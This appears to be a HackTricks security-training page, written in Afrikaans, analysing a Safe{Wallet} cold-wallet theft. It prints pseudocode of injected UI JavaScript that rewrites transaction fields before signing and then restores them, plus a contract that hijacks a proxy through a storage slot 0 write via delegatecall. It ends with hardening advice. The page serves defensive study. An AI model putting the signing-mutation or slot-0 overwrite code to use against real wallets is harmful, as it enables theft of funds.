# Web3 Ondertekeningswerkstroom Kompromie & Safe Delegatecall Proxy Oorname

{{#include ../../banners/hacktricks-training.md}}

## Oorsig

’n cold-wallet-diefstalketting het ’n **supply-chain compromise of the Safe{Wallet} web UI** gekombineer met ’n **on-chain delegatecall primitive that overwrote a proxy’s implementation pointer (slot 0)**. Die belangrikste afleidings is:

- As ’n dApp kode in die ondertekeningspad kan injekteer, kan dit ’n ondertekenaar laat produseer van ’n geldige **EIP-712 signature over attacker-chosen fields** terwyl dit die oorspronklike UI-data herstel sodat ander ondertekenaars onbewus bly.
- Safe proxies stoor `masterCopy` (implementation) by **storage slot 0**. ’n delegatecall na ’n kontrak wat na slot 0 skryf, “upgrade” effektief die Safe na die aanvaller-logika, wat volle beheer oor die wallet tot gevolg het.

## Off-chain: Gerigte ondertekeningsmutasie in Safe{Wallet}

’n gemanipuleerde Safe bundle (`_app-*.js`) het selektief sekere Safe- en ondertekenaaradresse geteiken. Die geïnjekteerde logika is uitgevoer net voor die ondertekeningsoproep:
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Aanvalseienskappe
- **Context-gated**: hard-coded allowlists vir slagoffer Safes/signers het geraas voorkom en opsporing verlaag.
- **Last-moment mutation**: velde (`to`, `data`, `operation`, gas) is onmiddellik voor `signTransaction` oorskryf en daarna herstel, sodat voorstel-payloads in die UI goedaardig gelyk het terwyl handtekeninge met die aanvaller-payload ooreenstem.
- **EIP-712 opacity**: wallets het gestruktureerde data getoon maar het nie geneste calldata ontleed of `operation = delegatecall` uitgelig nie, wat die gemuteerde boodskap effektief blind-signed gemaak het.

### Relevansie van Gateway-validasie
Safe-voorstelle word ingedien by die **Safe Client Gateway**. Voor die verskerpte kontroles kon die gateway 'n voorstel aanvaar waar `safeTxHash`/handtekening ooreenstem met verskillende velde as die JSON-body as die UI dit ná ondertekening herskryf het. Na die voorval verwerp die gateway nou voorstelle waarvan die hash/handtekening nie ooreenstem met die ingediende transaksie nie. Soortgelyke server-side hash-verifikasie moet op enige signing-orchestration API afgedwing word.

## On-chain: Delegatecall proxy-oorgang via slotbotsing

Safe proxies hou `masterCopy` by **storage slot 0** en delegeer alle logika daarnaartoe. Omdat Safe **`operation = 1` (delegatecall)** ondersteun, kan enige ondertekende transaksie na 'n arbitêre kontrak wys en sy kode in die proxy se stoor-konteks uitvoer.

’n Aanvallende kontrak het 'n ERC-20 `transfer(address,uint256)` nageboots, maar in plaas daarvan `_to` in slot 0 geskryf:
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Uitvoeringspad:
1. Slagoffers teken `execTransaction` with `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Safe masterCopy valideer handtekeninge oor hierdie parameters.
3. Proxy delegatecalls na `attackerContract`; die `transfer`-liggaam skryf na slot 0.
4. Slot 0 (`masterCopy`) verwys nou na aanvaller-beheerde logika → **volledige wallet-oorgreep en fondsonttrekking**.

## Opsporing & verhardingskontrolelys

- **UI-integriteit**: pin JS-bate / SRI; moniteer bundle-diffs; beskou die teken-UI as deel van die vertrouensgrens.
- **Validering tydens ondertekening**: hardware wallets with **EIP-712 clear-signing**; toon eksplisiet `operation` en decodeer geneste calldata. Weier ondertekening wanneer `operation = 1` tensy beleid dit toelaat.
- **Bedienerzijde hashkontroles**: gateways/services wat voorstelle deurstuur moet `safeTxHash` herbereken en valideer dat handtekeninge ooreenstem met die ingediende velde.
- **Beleid/toegangslyste**: preflight-reëls vir `to`, selektore, bate-tipes, en verbied delegatecall behalwe vir geverifieerde vloei. Vereis 'n interne beleiddiens voor die uitsending van ten volle getekende transaksies.
- **Kontrakontwerp**: vermy die blootstelling van arbitrêre delegatecall in multisig/treasury wallets tensy absoluut nodig. Plaas opgraderingswysers weg van slot 0 of beskerm met eksplisiete opgraderingslogika en toegangsbeheer.
- **Monitering**: waarsku oor delegatecall-uitvoerings vanaf wallets wat tesouriefondse hou, en oor voorstelle wat `operation` verander vanaf tipiese `call` patrone.

## References

- [In-depth technical analysis of the Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
